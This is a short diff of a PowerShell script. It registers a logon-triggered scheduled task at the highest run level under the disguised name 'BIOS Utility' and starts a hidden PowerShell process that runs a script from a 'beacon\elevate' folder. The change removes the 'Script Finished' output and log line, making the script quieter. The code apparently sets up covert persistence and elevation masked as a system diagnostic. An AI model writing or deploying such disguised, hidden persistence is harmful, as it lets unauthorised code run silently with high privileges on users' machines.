@@ -176,6 +176,4 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$
 $trigger = New-ScheduledTaskTrigger -AtLogon
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS Utility" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force
 Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"'
-Write-Host "Script Finished" -foregroundcolor Yellow
-echo "Script Finished" >> C:\temp\beacon\elevate\log.txt
-```
+# Write-Host "Script Finished" -foregroundcolor Yellow
